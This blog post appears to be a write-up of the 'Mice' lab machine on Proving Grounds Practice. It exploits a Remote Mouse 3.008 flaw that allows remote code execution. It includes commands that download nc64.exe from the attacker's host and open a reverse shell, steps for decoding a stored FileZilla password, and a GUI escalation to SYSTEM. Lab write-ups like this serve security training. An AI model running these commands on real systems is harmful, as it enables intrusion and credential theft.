---
layout: post
title: "Mice - Proving Grounds Practice"
summary: "Remote Mouse 3.008 → Remote Code Execution → FileZilla password → FileZilla recentservers.xml → RDP → CVE-2021-35448 → Remote Mouse GUI 3.008 - Local Privilege Escalation → SYSTEM"
---

# Mice - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed RDP and Remote Mouse ports were open.

<img width="785" height="525" alt="00nmap" src="https://github.com/user-attachments/assets/04150304-951c-4b9b-95cf-e9bd636fd422" />

## Exploitation
### Remote Mouse 3.008 RCE
`Remote Mouse 3.008` was vulnerable to remote code execution by sending arbitary mouse signals. So some research revealed [p0dalirius/RemoteMouse-3.008-Exploit](https://github.com/p0dalirius/RemoteMouse-3.008-Exploit) which allows you to send any command you want.

- At first I transfered nc64.exe 
```bash
python RemoteMouse-3.008-Exploit.py -t 192.168.224.199 -c 'powershell iwr http://192.168.45.216/nc64.exe -outfile C:\ProgramData\nc64.exe' -v
```

- Then I executed it and obtained reverse shell
```bash
python RemoteMouse-3.008-Exploit.py --target-ip 192.168.224.199 --cmd 'powershell -c "C:\ProgramData\nc64.exe 192.168.45.216 80 -e cmd.exe"' -v
```

- Ports other than port 80 was not working. So I had to use port 80.

Then I simply read local flag.

<img width="718" height="682" alt="01local" src="https://github.com/user-attachments/assets/9cdf3e20-5589-45ed-95c5-16957883bb71" />

## Privilege Escalation
### FileZilla Password (recentservers.xml)
I executed `WinPEAS.exe` and found two available FileZilla files.
1. `C:\Users\divine\AppData\Roaming\FileZilla\filezilla.xml` → version etc.
2. `C:\Users\divine\AppData\Roaming\FileZilla\recentservers.xml` → session information, password etc.

<img width="533" height="69" alt="02filezilla" src="https://github.com/user-attachments/assets/d39ef1ee-5090-481c-ae28-6c57cfd2a399" />

I read both of them. I noted FileZilla version then read base64 encoded FileZilla password.

<img width="881" height="219" alt="03filezillaversion" src="https://github.com/user-attachments/assets/cccf8b44-c9d0-4168-ba08-0aca44050766" />

<img width="659" height="324" alt="04recentservers" src="https://github.com/user-attachments/assets/dd4f799f-782e-4a59-94a3-35e4b1e35745" />

Then I decoded the password and RDP into same user we got reverse shell.

<img width="1576" height="736" alt="05rdp" src="https://github.com/user-attachments/assets/08663693-0793-4683-b8e9-c9e279df6e8b" />

### CVE-2021-35448
Emote Interactive Remote Mouse 3.008 on Windows allows attackers to execute arbitrary programs as Administrator by using the Image Transfer Folder feature to navigate to cmd.exe. It binds to local ports to listen for incoming connections.

This version of Remote Mouse was vulnerable to GUI based Privilege Escalation and as we have RDP session we could exploit this.

1. Open Remote Mouse from the system tray
2. Go to "Settings"
3. Click "Change..." in "Image Transfer Folder" section

<img width="1027" height="794" alt="06systemtray" src="https://github.com/user-attachments/assets/cb919e7c-bca7-4c64-8c8e-3b5533841607" />

4. "Save As" prompt will appear
5. Enter "C:\Windows\System32\cmd.exe" in the address bar and click enter

<img width="621" height="311" alt="07cmd" src="https://github.com/user-attachments/assets/9ef014d3-2bb9-4353-a776-79ca32f5ec4d" />

6. A new command prompt is spawned with SYSTEM privileges

Then I simply read Administrator flag.

<img width="698" height="580" alt="08gg" src="https://github.com/user-attachments/assets/a3b44ddf-c3b7-48d5-b42c-aec76d6df712" />





